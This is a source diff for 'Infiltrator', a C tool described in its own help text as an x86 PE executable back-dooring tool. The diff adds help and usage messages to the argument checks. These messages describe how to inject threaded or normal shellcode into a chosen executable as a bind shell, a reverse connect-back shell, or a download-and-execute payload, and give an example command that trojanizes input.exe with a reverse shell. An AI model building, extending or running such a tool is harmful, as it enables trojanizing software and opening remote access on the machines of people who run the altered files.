@@ -5,12 +5,14 @@
 	http://msdn.microsoft.com/en-us/library/ms809762.aspx
 	http://www.codereversing.com/blog/?p=92
 	http://www.alex-ionescu.com/part1.pdf
-	http://stackoverflow.com/questions/2188914/c-searching-for-a-string-in-a-file
 
 	Credits:
 			[*] corelanc0d3r "https://www.corelan.be".
+					"Thanks for the insight on the threaded shellcode & amazing tutorials"
 			[*] Sherif El deeb "http://eldeeb.net/wrdprs/".
+					"Thanks for the continous motovation, inspiration, & help through out this"
 			[*] Metasploit Team.
+					" Thanks for the amazingly well documented project metasploit framework"
 			 
 
 	PE Headers:
@@ -117,6 +119,47 @@ typedef struct _IMAGE_SECTION_HEADER {
 
 
 #define max_sections 0xF
+int usage_short()
+{
+	printf("[*] Infiltrator is a x86 PE executable Back-dooring tool\n");
+	printf("[*] Author: Saif El-Sherei\n\n");
+	printf("[*] Usage:\n\n");
+	printf(" Infiltrator -i [INPUT EXE] -o [OUTPUT EXE] -k (threaded) or -s (Normal) [type]\n");
+	printf("			 -p [PORT] -h [HOST] -u [URL] -f [URL path] -of [output file]\n");
+	printf("[*] Example:\n\n");
+	printf("infiltrator -i \"input.exe\" -o \"output.exe\" -k \"reverse\" -p 1234 -h \"127.0.0.1\"\n\n");
+	printf("[*] For more info please use: Infiltrator --help\n");
+	return 0;
+}
+int usage()
+{
+	printf("[*] Infiltrator is a x86 PE executable Back-dooring tool\n");
+	printf("[*] Author: Saif El-Sherei\n\n");
+	printf("[*] Usage:\n\n");
+	printf(" Infiltrator -i [INPUT EXE] -o [OUTPUT EXE] -k (threaded) or -s (Normal) [type]\n");
+	printf("		 -p [PORT] -h [HOST] -u [URL] -f [URL path] -of [output file]\n\n");
+	printf("[*] Example:\n\n");
+	printf("infiltrator -i \"input.exe\" -o \"output.exe\" -k \"reverse\" -p 1234 -h \"127.0.0.1\"\n\n");
+	printf("[*] Options:\n\n");
+	printf(" -i	INPUT file.exe (PE)\n");
+	printf(" -o  OUPUT file.exe (PE)\n");
+	printf(" -s	Normal Shellcode followed by one of the payload\n");
+	printf("	types\n");
+	printf(" -k	Threaded Shellcode followed by one of the payload\n");
+	printf("	types\n\n");
+	printf("[*] Payload Types:\n\n");
+	printf(" bind				Bind payload Followed by payload options\n");
+	printf(" reverse			Connect Back Payload Followed by payload options\n");
+	printf(" download & execute	Download & exec Payload Followed by payload options\n\n");
+	printf("[*] Payload Options:\n\n");
+	printf(" -p [port]			port to use (Bind or Reverse Payload)\n");
+	printf(" -h [host]			Host to connect to (Reverse Payload)\n");
+	printf(" -u [url]			URL to connect to (Download & Exec Payload)\n");
+	printf(" -f [path]			path to file to fetch (Download & Exec Payload)\n");
+	printf(" -of[output file]	output file to Execute from  Download & Exec Payload\n");
+	return 0;
+}
+
 
 DWORD align_to_boundary(unsigned int address,unsigned int boundary) //function to align givven address (IMAGE_SECTION_HEADER[i-1].Virtualsize+IMAGE_SECTION_HEADER[i-1].Misc.VirtualSize) to section alignment (boundary)
 {
@@ -312,25 +355,34 @@ for (count = 0; count < argc; count++)
 		of = (CHAR *)calloc(strlen(argv[count+1])+1,1);
 		strcpy(of,argv[count+1]);
 	}
+	if(!strcmp(argv[count],"--help"))
+	{
+		usage();
+		return -1;
+	}
 }
 if (k == TRUE && s == TRUE)
 {
 	printf("[*] Please choose one type of shellcode\n");
+	usage_short();
 	return -1;
 }
 if (k == FALSE && s == FALSE)
 {
 	printf("[*] Please choose shellcode type\n");
+	usage_short();
 	return -1;
 }
 if (bind == FALSE && reverse == FALSE && dwnexec == FALSE)
 {
 	printf("[*] PLease choose payload type\n");
+	usage_short();
 	return -1;
 }
 if (ifile == FALSE || o == FALSE)
 {
 	printf("[*] please Enter input and output file\n");
+	usage_short();
 	return -1;
 }
 if (bind == TRUE)
@@ -338,11 +390,13 @@ if (bind == TRUE)
 	if (p == FALSE)
 	{
 		printf("[*] Please Enter port number\n");
+		usage_short();
 		return -1;
 	}
 	else if (h == TRUE || v == TRUE || u == TRUE || f == TRUE)
 	{
 		printf("[*] Bind Shell only takes port as an argument\n");
+		usage_short();
 		return -1;
 	}
 	else
@@ -357,11 +411,13 @@ if (reverse == TRUE)
 	if (p == FALSE || h == FALSE)
 	{
 		printf("[*] Please enter host, and port to connect back to\n");
+		usage_short();
 		return -1;
 	}
 	else if ( v == TRUE || u == TRUE || f == TRUE)
 	{
 		printf("[*] Reverse Shell only requires host and port\n");
+		usage_short();
 		return -1;
 	}
 	else
@@ -379,11 +435,13 @@ if (dwnexec == TRUE)
 	if ( v == FALSE || u == FALSE || f == FALSE)
 	{
 		printf("[*] Download & execute takes three arguments\n");
+		usage_short();
 		return -1;
 	}
 	else if ( p == TRUE || h == TRUE)
 	{
 		printf("[*] Download & Execute Needs only URL, URI, output file\n");
+		usage_short();
 		return -1;
 	}
 	else
